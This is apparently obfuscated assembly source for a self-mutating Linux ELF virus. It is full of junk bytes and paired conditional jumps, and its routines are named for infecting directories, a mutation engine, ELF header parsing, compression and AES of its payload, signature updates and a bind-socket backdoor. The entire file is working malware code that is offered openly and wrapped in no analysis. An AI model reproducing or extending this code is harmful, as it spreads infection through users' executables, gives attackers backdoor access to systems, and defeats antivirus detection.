    mov         rdx, rdx
    jl          MutationEngine
    jge         MutationEngine
..@QxxBlCj01cUW:
    pop         rcx
    pop         rsi
    xor         rax, rax
    jl          ..@zSbamrHaDhXY
    jge         ..@zSbamrHaDhXY
..@c5b6NYZTKCsp:
    mov         r1, QWORD [r5+e_h.e_shoff]
    jmp         $+4
db 0x27, 0xf3
    js          ..@lP5lPdMgt1JI
    jns         ..@lP5lPdMgt1JI
ConvertJumpToDoubleJump:
    jmp         ..@RzqBrMURwYiq
..@KemEgyOqoiLR:
    mov         bx, dx
    mov         bl, 0ebh
    mov         DWORD [rdi], ebx
    jmp         $+5
db 0xc7, 0xaf, 0xba
    js          ..@E1QgtrbpVcT5
    jns         ..@E1QgtrbpVcT5
..@wbmivYj3L7F6:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    jmp         $+3
db 0x3d
    jmp         ..@jOLcIw56oRRN
..@Pbaq65NybHxY:
    mov         rbp, rbp
    push        r4
    jmp         $+4
db 0xb0, 0xb0
    js          ..@vB5r8ovFW3U9
    jns         ..@vB5r8ovFW3U9
..@MTN77MBzayJf:
    mov         m7, rdi
    add         m7, rax
    mov         rdi, m6
    jmp         ..@KOYp3MT05R0B
..@0nipeZ7hntDl:
    call_vsp    Strncmp
    test        ax, ax
    jmp         ..@eF0jqcs6MfUm
..@V69wwNogNNQw:
    mov         r2, r4
    call        AddSizeMappedFile
    jmp         $+3
db 0x08
    jb          ..@BIB4k3s9AaK5
    jae         ..@BIB4k3s9AaK5
..@XjbhxNEg0C24:
    xor         rax, rax
    jb          ..@X6Iwc85JZysd
    jae         ..@X6Iwc85JZysd
..@k1GDfexAqxea:
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    jmp         $+4
db 0x73, 0x25
    jmp         $+5
db 0x7c, 0xa1, 0x9f
    je          ..@zIR1spb7QLLr
    jne         ..@zIR1spb7QLLr
..@OFqzdbC12gcU:
    mov         rsp, rsp
    push        rcx
    pop         rcx
    jb          ..@y10ndyWNSLMC
    jae         ..@y10ndyWNSLMC
..@bU2QdPfZw1D0:
    xor         r2, r2
    jmp         $+4
db 0x98, 0xd5
    jmp         $+5
db 0x45, 0x87, 0x61
    jb          ..@o9oH3NiVX2Fg
    jae         ..@o9oH3NiVX2Fg
..@JtzHLBXQX9bq:
    xchg        rax, rax
    js          ..@LiEv31Jznf6x
    jns         ..@LiEv31Jznf6x
..@qx6LZXOTOb7H:
    mov         rdi, rdi
    jmp         $+5
db 0x9e, 0xdf, 0x99
    jmp         ..@XmT8GtMdfRr8
..@uNqmqAsuezuJ:
    xchg        rbx, rbx
    mov         rax, rax
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    jmp         $+3
db 0x80
    js          ..@eXuvS1YGvUQS
    jns         ..@eXuvS1YGvUQS
..@y10ndyWNSLMC:
    xchg        rdx, rdx
    jmp         $+3
db 0x16
    jmp         ..@D8banpNB4D8h
..@DEzLasrSuJ8L:
%ifndef ENABLE_DEBUGGING
    cmp         rax, 0x0
    jl          ..@eLAQFp4O4zCz
%endif
    jmp         $+4
db 0xbf, 0x66
    jmp         ..@CF26boOO4byM
..@wY1ZVyqBpime:
    je          ..@JhkRtZSpGDmp
    cmp         rdi, rsi
    jbe         ..@u1Aq4nMY4TnA
    jmp         $+5
db 0x16, 0x26, 0xa9
    jmp         $+5
db 0x87, 0x15, 0xdf
    jmp         $+4
db 0x18, 0x74
    jmp         ..@0MFgA6liNzKy
..@V77p2Q7r4Y9m:
%ifdef X86_64
    je          ..@TlOOr11ZBt9S
%endif
    jmp         $+4
db 0xfe, 0x89
    jl          ..@wMYZDEPLGcFe
    jge         ..@wMYZDEPLGcFe
..@4hfdeSxB8Emq:
    aesenc      xmm0, xmm1
    jl          ..@J6n8T6WSEDPr
    jge         ..@J6n8T6WSEDPr
..@QQb0Jl0peDNq:
    mov         rcx, rcx
    js          ..@mHywAphL1bor
    jns         ..@mHywAphL1bor
..@8adsddSP1sdT:
    xor         r1, r1
    jmp         $+3
db 0x01
    js          ..@uxZg656EmiXc
    jns         ..@uxZg656EmiXc
..@rLKEwkFkb1r0:
%ifdef X86_32
    push        rax
    xchg        rax, rax
    pop         rax
%endif
    jmp         $+5
db 0x14, 0x60, 0x68
    jmp         ..@5vvu2keQw37y
..@GQAbyboOCvRO:
%ifdef X86_64
    shr         rdx, 19
%endif
    jmp         ..@lSc44rdQYwwd
..@3VUSlwl2QWs1:
    mov         QWORD [r5+file.fileptr], rax
    mov         QWORD [r5+file.filesize], r3
    jmp         $+3
db 0x29
    jmp         ..@eoUaMIbKKw35
..@odaDoTAdJMC6:
    mov         BYTE [rsi], 05h
    push        rax
    pop         rax
    jmp         $+5
db 0x67, 0xff, 0x1c
    jmp         ..@7oskJ0k6bJHP
..@mWv1EZjNjHuJ:
    xchg        rbx, rbx
    mov         edx, DWORD [rdi]
    jmp         $+4
db 0xcc, 0x85
    jmp         $+4
db 0xe6, 0xe4
    jmp         $+5
db 0x70, 0xd4, 0xdd
    jmp         ..@ridzAZB008TG
..@ryyRiRDTi0cg:
    xchg        rax, rax
    push        rsi
    jl          ..@EME3uUWAUnV6
    jge         ..@EME3uUWAUnV6
..@PGNZGxkqYuIE:
    pop         rbx
    jz          ..@uswXa1C0FXXV
    call        ConvertMoveValueToPushPopValue
    js          ..@FP1AWrXQbgVR
    jns         ..@FP1AWrXQbgVR
..@AH8HPWdPUMwU:
%ifdef X86_64
    jmp         ..@dgDHPgaxDfbu
%endif
    js          ..@xCVG4qGhmYVF
    jns         ..@xCVG4qGhmYVF
..@KIWyA8M8aPFp:
    syscall
    rep         nop
    CFILE       DWORD [rsp+_KEYGEN_OFF.fd]
    jmp         $+3
db 0x84
    js          ..@TTVcsW75EvcK
    jns         ..@TTVcsW75EvcK
..@VORRuz4SL90B:
    rep         nop
    je          ..@88es0hZbduSg
    jne         ..@88es0hZbduSg
..@DEtTsFbJTR3v:
    mov         rax, rax
    xor         rax, rax
    jl          ..@QQb0Jl0peDNq
    jge         ..@QQb0Jl0peDNq
..@HHHOrlucRcC5:
    xor         r4, r4
    jmp         $+4
db 0x55, 0xdf
    jmp         ..@crx9UFqLtFKc
..@wxRGFXLuTNqB:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x50]
    jmp         $+4
db 0x8c, 0xca
    jmp         ..@qbLReQ7Aj83z
..@XPZ5D6RrjRuV:
    syscall
    jmp         ..@6aIHVPro1H8t
..@JLCnh6WHD4wM:
    xchg        rbx, rbx
    jmp         $+3
db 0xc6
    jmp         ..@lAibBc5b5VUP
..@Yw9PJTnY77el:
    mov         r1, rax
    xor         r2, r2
    push        rbx
    jmp         $+5
db 0xf1, 0x82, 0x02
    je          ..@bGTp9rtin254
    jne         ..@bGTp9rtin254
..@aJdaT0C65SYP:
%ifdef X86_32
    cmp         dx, 00c081h
    je          ..@TlOOr11ZBt9S
%endif
    jmp         $+4
db 0x42, 0xeb
    jmp         $+5
db 0xab, 0x2d, 0x9c
    jmp         $+5
db 0x4f, 0xa3, 0x70
    jmp         $+4
db 0xa7, 0xb1
    jb          ..@pyDkljr1bvDw
    jae         ..@pyDkljr1bvDw
..@NyLKBCnJamHQ:
    mov         rax, (-1)
    jb          ..@G95fqYnvF1AA
    jae         ..@G95fqYnvF1AA
..@BZnoijiJZFhT:
    cmp         dl, 6ah
    xchg        rcx, rcx
    js          ..@go8Khz5CQu8T
    jns         ..@go8Khz5CQu8T
..@WUgoiN76opmE:
    je          ..@RZxOUEC6HSLH
    xchg        rbx, rbx
    mov         rdx, rdx
    jmp         $+4
db 0xd3, 0x23
    jmp         $+4
db 0x83, 0xdb
    jmp         ..@IXbH35P888Oh
..@LTUqOMTWieh9:
    mov         r2, 1
    call        InfectDirectory
    jmp         ..@BXbNSDPmerc2
..@UedBvfZCw9gT:
    pop         rdx
    jmp         $+3
db 0xac
    jmp         $+4
db 0xab, 0x05
    jmp         $+4
db 0x10, 0x20
    jb          ..@PsqkbZUMqu1C
    jae         ..@PsqkbZUMqu1C
..@fyTf3CTSOSVv:
    pop         rcx
    jmp         $+5
db 0x43, 0xf2, 0x53
    jmp         $+5
db 0xa4, 0xfe, 0xab
    js          ..@kziuSOezBNPL
    jns         ..@kziuSOezBNPL
..@vVjf1EvbglVI:
%ifdef X86_64
    or          rdi, rax
%endif
    jmp         $+5
db 0x5d, 0xb0, 0x47
    jl          ..@aY7fhA7Mr0Vu
    jge         ..@aY7fhA7Mr0Vu
..@eXuvS1YGvUQS:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    jmp         $+3
db 0xd9
    jmp         ..@pCwUEfA62ysq
..@u3ot3GIosCqA:
    pop         rsi
    jmp         ..@XUz7oqxGBCpc
..@2K19Yi4ljM8F:
    pop         rcx
    jl          ..@EWqZMStOmsVL
    jge         ..@EWqZMStOmsVL
..@r3sKWspRz9Ne:
%ifdef X86_32
    and         dx, 0c0ffh
%endif
    je          ..@d5FRLPSoxmX6
    jne         ..@d5FRLPSoxmX6
..@ndhmfDKccydX:
%ifdef X86_64
    jne         ..@D67Wc1UAM9AW
%endif
    jmp         $+3
db 0xd4
    js          ..@IDndLUESLWwx
    jns         ..@IDndLUESLWwx
..@3qAIVa1Mip81:
    push        rbp
    mov         rbp, rsp
    jmp         $+5
db 0x1d, 0x5f, 0xed
    jmp         ..@k9MAwOWPHYxn
..@Efp5fq25lcoG:
    xchg        rsp, rsp
    mov         rsi, QWORD [rsp+bytes]
    mov         rbx, rbx
    jmp         $+4
db 0xa5, 0x5b
    jmp         $+5
db 0x6e, 0x76, 0x08
    jmp         ..@s2wVh5YtkNwN
..@q0QsByv1y2RR:
%ifdef X86_32
    mov         BYTE [esi+ecx], 90h
%endif
    jmp         $+3
db 0x45
    jmp         $+3
db 0x7c
    je          ..@lew1IKercMrr
    jne         ..@lew1IKercMrr
..@QtZmN8mXnCK6:
    add         r5, rax
    jmp         $+4
db 0x83, 0x8b
    jl          ..@6fFNj4HXmtyj
    jge         ..@6fFNj4HXmtyj
..@J2zLCZsjaEQL:
    jz          ..@CihbPVsTeTLj
    mov         rsi, QWORD [rsp+bytes]
    add         rsi, QWORD [rsp]
    js          ..@PTfk1hp6SeRu
    jns         ..@PTfk1hp6SeRu
..@6jlkif4KDwFf:
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         ..@yovtGKM5UGaj
..@GdlEQqmXwYDM:
    push        rbx
    pop         rbx
    jmp         $+5
db 0xc9, 0xb1, 0xd7
    jmp         $+4
db 0x49, 0xfc
    jmp         ..@k1GDfexAqxea
..@tTaPaAFvqSqr:
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    jmp         $+3
db 0xac
    jl          ..@R8rEnv9vITjg
    jge         ..@R8rEnv9vITjg
..@Q3cyj4z3mdgS:
    jne         ..@BxYkwVEfujhX
    jmp         $+4
db 0x00, 0xe7
    jmp         $+5
db 0x31, 0x3d, 0x3b
    jb          ..@cQLLARweLFMR
    jae         ..@cQLLARweLFMR
..@RN8cLbxeCoeS:
    jle         ..@VIudUbte6qRw
    jl          ..@8td6nhslHxPX
    jge         ..@8td6nhslHxPX
..@6e0MHlVBhdYv:
%ifdef X86_32
    push        rdi
%endif
    js          ..@UjMLSHgj6bkj
    jns         ..@UjMLSHgj6bkj
..@7E4bycw6Qoqi:
    xor         rbx, rbx
    add         rsi, 1
    mov         dl, BYTE [rsi]
    jmp         $+4
db 0xf0, 0x96
    jmp         ..@1lBDBezIq1rp
..@NZw4GFAuMcMW:
    lea         r4, [r1]
    add         r4, r3
    jmp         $+5
db 0x1c, 0x10, 0xb6
    jb          ..@8t1KwSV0wjnZ
    jae         ..@8t1KwSV0wjnZ
..@xbO8jaO25GTz:
%ifdef X86_64
    mov         bl, 48h
    mov         edx, DWORD [rdi]
%endif
    jmp         $+5
db 0x5d, 0x4d, 0x79
    jmp         ..@8heAxOtaOFdR
..@w1Re8m6sZjzA:
%ifndef ENABLE_DEBUGGING
    xchg        rdi, rdi
%endif
    jl          ..@nhfgGG0w6skm
    jge         ..@nhfgGG0w6skm
..@U3RpwZN8WUUF:
    pop         rdx
    jmp         $+5
db 0xbb, 0x65, 0x40
    jmp         $+4
db 0xaa, 0xa2
    jmp         ..@BMGW2vCQHQKv
..@PXfKk7reBo37:
    push        rax
    pop         rax
    jl          ..@S6DKNnmKMLPa
    jge         ..@S6DKNnmKMLPa
..@YzsqwtvqzHfR:
    pop         rbx
    jmp         ..@ZduL6qpTYMGh
..@BXgS3dX0jPme:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    mov         rax, rax
    jl          ..@zpXtgJwdEoUh
    jge         ..@zpXtgJwdEoUh
..@i63JJIurgubZ:
    mov         DWORD [r5+_signature.poly_preview-_start+(r4*2)], eax
    add         r4, 2
    cmp         r4, 0x8
    jmp         ..@qANSYYncNqBS
..@TbWPyjEpNWcD:
%ifdef X86_64
    cmp         edx, 0000b841h
%endif
    jmp         $+3
db 0x0e
    js          ..@7v0Kl1pw4btR
    jns         ..@7v0Kl1pw4btR
..@YxTJqzQcjJ4O:
    jmp         ..@VIudUbte6qRw
    js          ..@HHaWXFCPNkik
    jns         ..@HHaWXFCPNkik
..@Xk9NhzIPMP7R:
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    jb          ..@YQZA2x87yJVc
    jae         ..@YQZA2x87yJVc
..@LkSL9DZSaqWm:
    push        rsi
    pop         rsi
    pop         r2
    jmp         $+4
db 0x8c, 0x7f
    js          ..@SSA55P1Q7RjG
    jns         ..@SSA55P1Q7RjG
..@R8rEnv9vITjg:
    shl         ebx, LENGTH_BITS
    jmp         $+5
db 0x5e, 0xd0, 0x2c
    jmp         $+3
db 0x4f
    jmp         ..@TUMKCIW5l5SJ
..@oO9fjNQFUV2V:
%ifdef X86_64
    cmp         dx, 0548h
%endif
    jl          ..@v7MxfUkbqGA1
    jge         ..@v7MxfUkbqGA1
..@gyzCrlNp3qzP:
%ifdef X86_64
    shr         rdx, 16
%endif
    js          ..@FWSnk7UXpmO2
    jns         ..@FWSnk7UXpmO2
..@TjWcPUuBzEKP:
    mov         rcx, QWORD [rsp]
    jmp         $+4
db 0xe8, 0xb2
    js          ..@loRlHd9g15qS
    jns         ..@loRlHd9g15qS
..@b4Q6YQEBTlxQ:
    mov         r1, QWORD [r5+file.filename]
    jmp         ..@g0REn8GOAfUj
..@v3Ldp2BWGfaJ:
%ifdef X86_32
    pop         rdx
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
%endif
    jmp         $+3
db 0x21
    jmp         $+5
db 0x31, 0x5b, 0xe1
    jmp         ..@Zz396jjHEe4l
..@5zfBBNKMOIcs:
%ifndef ENABLE_DEBUGGING
    xchg        rax, rax
    push        rcx
%endif
    jmp         $+5
db 0x11, 0x59, 0x9e
    jmp         ..@JWemkdSCMqTf
..@QR4nSlQ4kaBE:
    mov         ecx, DWORD [rsp+_MUTA_OFF.index]
    jmp         ..@f8efa55tw663
BackDoor:
    jmp         ..@6OaHRQvqzscL
..@1bmAWiSkKa39:
    mov         rsi, rsi
    js          ..@QgvFT44Sdqd9
    jns         ..@QgvFT44Sdqd9
..@WDdG6u15BpYv:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    js          ..@vT22GHSkU50a
    jns         ..@vT22GHSkU50a
..@6q3Z5MUY2To1:
    mov         r5, QWORD [rsp+_UPDATASIG_OFF.meta_ptr+0x20]
    jmp         ..@i63JJIurgubZ
..@3FFJargPpwMz:
    add         rdi, _signature.key_preview-_signature.start
    jmp         $+4
db 0x3c, 0x74
    js          ..@sqe6xnay1ogZ
    jns         ..@sqe6xnay1ogZ
..@DXHd02N9Y4E6:
    ret
    jmp         $+3
db 0xa3
    jmp         $+3
db 0xae
    jmp         ..@vXmrtO6m2SmM
..@gIUhrMFEQHgD:
    mov         rax, rax
    jmp         $+3
db 0x1c
    jl          ..@0tjfjn0cGnEi
    jge         ..@0tjfjn0cGnEi
..@ap1OFRjhzpq1:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         InfectionRoutine
..@GcEIOY8qRmqd:
    shl         edx, 8
    jmp         $+4
db 0x47, 0x55
    je          ..@trIo0ovGBoQS
    jne         ..@trIo0ovGBoQS
..@bHAjlu5jN9ee:
    mov         rax, SYS_GETUID
    syscall
    test        eax, eax
    jmp         $+3
db 0x23
    jmp         $+4
db 0x29, 0x2a
    jl          ..@3YIMPPTq4HDL
    jge         ..@3YIMPPTq4HDL
..@lsK5AxofgMQ9:
    jmp         ..@tXkh6qt8Ddiz
    je          ..@WbkAWMVsyCgj
    jne         ..@WbkAWMVsyCgj
..@65vglO7fE3Bp:
    test        al, al
    jz          ..@QnAcoLRrgE9Z
    jmp         $+4
db 0x3a, 0x7a
    js          ..@2NpIvKnOc7Pl
    jns         ..@2NpIvKnOc7Pl
..@L516CikN1GDW:
    cmp         edx, 000000b8h
    je          ..@4T7V149Ik8Xd
    mov         rax, rax
    jmp         $+4
db 0xbb, 0xf4
    jmp         $+3
db 0x2c
    jb          ..@l1Oumfj6OxTn
    jae         ..@l1Oumfj6OxTn
..@ydxgYMNAIgM8:
    pop         rcx
    jmp         $+5
db 0x44, 0x82, 0x24
    jmp         $+3
db 0x0e
    jb          ..@YsEYEZwACtql
    jae         ..@YsEYEZwACtql
..@HHaWXFCPNkik:
    push        rdx
    jb          ..@UedBvfZCw9gT
    jae         ..@UedBvfZCw9gT
..@BMGW2vCQHQKv:
    push        rbx
    pop         rbx
    jmp         ..@JZAziRuAUJ0Q
..@EvPA0VDnkpF9:
    push        rsi
    pop         rsi
    jmp         ..@X1xgrXKRVzm6
..@lSrWTU0rFAU4:
    pop         rax
    mov         rax, 0x1
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    js          ..@VttC82lhuhqu
    jns         ..@VttC82lhuhqu
..@PGZQbp9WRdF8:
    push        r4
    push        r3
    push        r2
    js          ..@r6g9AiHAca5e
    jns         ..@r6g9AiHAca5e
..@EDEIJorH3d7j:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jne         ..@qRjpeFo45cd1
    xor         rcx, rcx
    je          ..@9An8hhxGWMoA
    jne         ..@9An8hhxGWMoA
..@ridzAZB008TG:
    push        rcx
    jmp         $+5
db 0xfc, 0xdc, 0x6e
    jl          ..@i1jW1qunKpnX
    jge         ..@i1jW1qunKpnX
..@UtTZ0Myf2iar:
%ifdef X86_64
    shr         bx, 8
%endif
    jmp         ..@qv0KdPdnnNdt
..@DaTWSiiEzLMQ:
    mov         BYTE [rsi], bl
    jmp         ..@ydxgYMNAIgM8
..@wPXGuHug9CjI:
    pop         rcx
    js          ..@9VxprLxMwhWQ
    jns         ..@9VxprLxMwhWQ
..@xuIJqcPiDEUX:
%ifdef X86_32
    and         dx, 0f8f8h
%endif
    jmp         $+4
db 0x5d, 0x2d
    jmp         $+5
db 0x0d, 0xb5, 0xca
    jl          ..@PJd52C4Yo2Pv
    jge         ..@PJd52C4Yo2Pv
..@4T7V149Ik8Xd:
    xor         rdx, rdx
    js          ..@u9VaqPputuQs
    jns         ..@u9VaqPputuQs
..@4QdH7xjBsO4p:
    pop         r1
    ret
    jmp         AddSizeMappedFile
..@jGU44wOkZ9gc:
%ifdef X86_32
    xchg        rsi, rsi
    mov         rbx, rbx
%endif
    jmp         $+5
db 0x5c, 0xfb, 0x93
    js          ..@CWxnXG3wUUoz
    jns         ..@CWxnXG3wUUoz
..@OsSaY63hHUhE:
%ifdef X86_64
    mov         rdx, rdx
    mov         rbx, rbx
    mov         rbp, rbp
%endif
    jmp         ..@HIojJATnW4ZR
..@aVl3HNHI8RTH:
    test        dl, dl
    xchg        rbx, rbx
    jmp         $+3
db 0xe6
    jmp         ..@5TXvSPi4Cb5m
..@C1rvp62M5x3u:
    mov         rax, 0xff
    jl          ..@UBVZsJd2LSvA
    jge         ..@UBVZsJd2LSvA
..@CihbPVsTeTLj:
    xchg        rdx, rdx
    jmp         ..@MZWk3UYDAGmZ
..@aO6Xrz8Tjt3j:
    add         ebx, 1
    mov         DWORD [rsi], ebx
    jmp         $+3
db 0x6c
    js          ..@dwLr409jYmZ1
    jns         ..@dwLr409jYmZ1
..@Vt6fcraHmQE8:
    jnz         ..@0Xqqp1KMJv1l
    jmp         ..@0pxzm6DyhUwO
..@SsRd9SeEWNUH:
    xchg        rsi, rsi
    jl          ..@RMyoHGWj7vKE
    jge         ..@RMyoHGWj7vKE
..@CVjVoYHWEsDA:
    VAR         packed, dirs_root
    push        rdi
    jmp         $+4
db 0xea, 0x84
    jmp         $+4
db 0xb1, 0x8c
    jmp         $+4
db 0x05, 0x9d
    jmp         ..@Krd3I7DScwxQ
..@bdzb1W0O0L56:
    rep         nop
    jmp         $+5
db 0xc8, 0xaf, 0x58
    jmp         $+3
db 0x3e
    jb          ..@O1eDQxFG96c4
    jae         ..@O1eDQxFG96c4
..@bGTp9rtin254:
    pop         rbx
    xor         r3, r3
    xor         r4, r4
    jl          ..@TtcbyFKXIdtF
    jge         ..@TtcbyFKXIdtF
..@uxZg656EmiXc:
    call_vsp    ExitProgram
    jl          ..@IvCgQuVXU7N6
    jge         ..@IvCgQuVXU7N6
..@PvskUD6dBeN7:
    jge         ..@FjzCtjpiGDrH
    jmp         $+3
db 0x87
    je          ..@7Zm1IRXN121S
    jne         ..@7Zm1IRXN121S
..@7Zm1IRXN121S:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jmp         $+4
db 0xbf, 0x76
    jmp         $+3
db 0xeb
    je          ..@ETjDUifWuOxs
    jne         ..@ETjDUifWuOxs
..@qB14iNGfS3ub:
    or          bl, cl
    shl         rbx, 8
    jmp         ..@P6Gex4X6DAEG
..@M8lFXCLBaPst:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         eax, SYS_BIND
    syscall
%endif
    jmp         ..@BKaoTHzsmgTZ
..@dxJpV2zcLC19:
%ifdef X86_64
    mov         dil, 41h
%endif
    jl          ..@AH8HPWdPUMwU
    jge         ..@AH8HPWdPUMwU
..@ygK59Gy0sX7l:
    jmp         ..@RyNUexJUqHmS
    jmp         $+3
db 0xc2
    je          ..@ZCmTFeu3e8uO
    jne         ..@ZCmTFeu3e8uO
..@0SsILXeW8XCc:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_PRCTL
%endif
    js          ..@eutDmJXG0E2c
    jns         ..@eutDmJXG0E2c
..@eLAQFp4O4zCz:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
%endif
    jmp         $+5
db 0xf9, 0xfe, 0x1c
    jmp         $+4
db 0x00, 0xe4
    jmp         ..@DjKijTALoKm1
..@fuSvX8MNKVM4:
    xchg        rsp, rsp
    jmp         ..@gdvLcxcDzWBy
..@VVAFW0q8GIyk:
    pop         rax
    jmp         $+3
db 0xff
    jmp         $+3
db 0xed
    jb          MapFile
    jae         MapFile
..@TtcbyFKXIdtF:
    mov         rax, SYS_WAIT4
    jmp         $+5
db 0xd7, 0x63, 0xb6
    jb          ..@XUI9t2KSIoFS
    jae         ..@XUI9t2KSIoFS
..@optQ5hxUcfCq:
    pop         r3
    js          ..@ukdT8x5La4Q0
    jns         ..@ukdT8x5La4Q0
..@dzZyYPM4IUOJ:
    mov         rax, rax
    je          ..@4QdH7xjBsO4p
    jne         ..@4QdH7xjBsO4p
..@ePbEeT83Mabu:
    or          bl, 0b8h
    push        rsi
    js          ..@5WcZY91DYcRB
    jns         ..@5WcZY91DYcRB
..@Da0RAFMi95Mc:
    cmp         rax, 0x00
    jle         ..@XNOmR0xuBk3G
    js          ..@xMH8yRVH8aUY
    jns         ..@xMH8yRVH8aUY
..@X6Iwc85JZysd:
    ret
    jmp         $+4
db 0x10, 0x97
    js          ..@oT4CWDc1vEiq
    jns         ..@oT4CWDc1vEiq
..@pb4PdKEHxbd0:
    pop         rcx
    js          ..@ew5GBZWP66xm
    jns         ..@ew5GBZWP66xm
..@J6n8T6WSEDPr:
    movdqu      xmm1, oWORD [rsp+0xb0]
    aesenc      xmm0, xmm1
    mov         rbx, rbx
    jl          ..@tw6EPzzSee3I
    jge         ..@tw6EPzzSee3I
..@1k0D7lbWNT0q:
    mov         WORD [rdi], 9090h
    jmp         $+5
db 0x10, 0x51, 0xfb
    jmp         $+4
db 0x1e, 0xcd
    je          ..@CihbPVsTeTLj
    jne         ..@CihbPVsTeTLj
..@aFf1HmGowQOv:
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    jmp         ..@XJ85uW7FZbSy
..@5AWDfgnHZeUL:
%ifndef ENABLE_DEBUGGING
    xor         r5, r5
    syscall
    xor         rax, rax
%endif
    js          ..@yzZwDbW8nSP2
    jns         ..@yzZwDbW8nSP2
..@GOvCHOilKDbc:
    or          dl, 80h
    jmp         $+3
db 0xa1
    jb          ..@GcEIOY8qRmqd
    jae         ..@GcEIOY8qRmqd
..@TZI5pPOYOHXX:
    shr         ecx, 8
    and         ecx, 0ffh
    jl          ..@Woe2ZseCdVr6
    jge         ..@Woe2ZseCdVr6
..@OKvWNxol0i0B:
    mov         BYTE [rdi+1], dl
    jmp         ..@aiF2eaX1Jk2X
..@ahKlxwhiLqeL:
    xor         rax, rax
    ret
    jmp         $+5
db 0x80, 0xb8, 0xb5
    jmp         $+3
db 0x8a
    jmp         $+4
db 0x0d, 0x1e
    jmp         $+3
db 0x5e
    jmp         ..@2K19Yi4ljM8F
..@e8SSAXYVC3TA:
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    jmp         ..@5WGndJYv5CI5
..@INVtTYitlYXW:
    cmp         dx, 800fh
    je          ..@pqS8zI91DiSi
    jmp         ..@oRqBQCUG7ZZe
    jmp         $+3
db 0xdc
    jmp         ..@pqS8zI91DiSi
..@BPseEGp6laXx:
    xor         rax, rax
    jmp         $+4
db 0xd6, 0x3e
    jmp         $+4
db 0xb3, 0x8b
    jmp         ..@qxbKfLiWGLqp
..@etw4WNzzENnP:
    sub         rcx, rsi
    jmp         $+3
db 0x34
    jmp         $+4
db 0x79, 0x0e
    jb          ..@QesUTikrPhpJ
    jae         ..@QesUTikrPhpJ
..@mF74p7VXUH2e:
    push        rax
    jb          ..@c7V9mQJazoyq
    jae         ..@c7V9mQJazoyq
..@MWcRu6EfA1Mv:
    pop         rcx
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    add         r2, 1
    jl          ..@xLZFf3HwpiKp
    jge         ..@xLZFf3HwpiKp
..@yvQzspz6zfxY:
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    jmp         $+3
db 0x34
    jmp         $+4
db 0x28, 0x18
    jb          ..@GLjIMezr7lam
    jae         ..@GLjIMezr7lam
..@c6A7QwHhdfYb:
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jmp         ..@rxlIWByuTwKM
..@EzGzqsuNjfcp:
    rep         nop
    jmp         $+3
db 0x46
    jmp         ..@casEFp6uBhSw
..@OOwATJzGL90N:
    mov         rsi, QWORD [rsp+bytes]
    jmp         $+5
db 0x61, 0xed, 0x14
    jmp         $+4
db 0xff, 0xf7
    jmp         $+3
db 0xb1
    jb          ..@TjWcPUuBzEKP
    jae         ..@TjWcPUuBzEKP
..@tqiR2TBYqkd1:
    mov         rax, rsp
    add         rax, bytes
    mov         rdx, rdx
    jmp         $+5
db 0x17, 0xc3, 0xd5
    jmp         $+4
db 0x4d, 0x89
    je          ..@r2sYUl2aLIpo
    jne         ..@r2sYUl2aLIpo
..@DkH944DOdydq:
    jz          ..@pM1IXJvi1Cs4
    jmp         $+5
db 0x47, 0x87, 0x4a
    jmp         $+3
db 0x5a
    jmp         ..@Vj6nQKqyOLl7
..@tRQgcVEpIQNn:
    xchg        rdi, rdi
    add         eax, 0x57
    xchg        rdx, rdx
    jmp         $+4
db 0x3c, 0xf5
    jmp         $+4
db 0x86, 0x88
    jl          ..@Wsno4DLvckaC
    jge         ..@Wsno4DLvckaC
..@ETjDUifWuOxs:
    jge         ..@5WpIo8mMLQLd
    xchg        rsp, rsp
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    jmp         ..@SiDTMIx9T49H
..@BzOmvkU3JGsv:
    xor         rdx, rdx
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    sub         dl, cl
    jmp         ..@jm2m1dcCa0wU
..@f4cu2fo7TTIt:
%ifdef X86_64
    push        rdi
%endif
    jmp         $+4
db 0x48, 0x05
    jmp         $+3
db 0xd2
    jmp         ..@IOgO0JemUnV7
..@j50PfFeHeVWY:
    cmp         BYTE [r1], 0x39
    jg          ..@xGQ7GtefNnxB
    jmp         $+3
db 0x9d
    jmp         ..@yZZQCbsTC2SX
..@4OcDLE6ObNmO:
    xchg        rsi, rsi
    pop         rax
    jmp         $+3
db 0xa9
    jmp         $+4
db 0xb4, 0xf1
    jmp         ..@ymO8CUJOf2fz
..@3BDsqhoXdvwl:
    cmp         BYTE [rdi+rcx], 90h
    jne         ..@ti8xBiKnC8wo
    jmp         ..@yBz7PolRxwJn
..@BZOMTd2RPvLf:
    mov         rdi, rdi
    jmp         $+4
db 0xfe, 0x22
    je          ..@DfjivHPpzAmd
    jne         ..@DfjivHPpzAmd
..@Pniixj5OSa0p:
%ifdef X86_32
    mov         WORD [esi+ecx], bx
%endif
    jmp         $+4
db 0x7d, 0x9b
    jb          ..@2u018JOt5pcM
    jae         ..@2u018JOt5pcM
..@aTsOUHHFAfRF:
    jmp         ..@ouorjOD8AGZy
    jmp         ..@jaKizfX2Q2GO
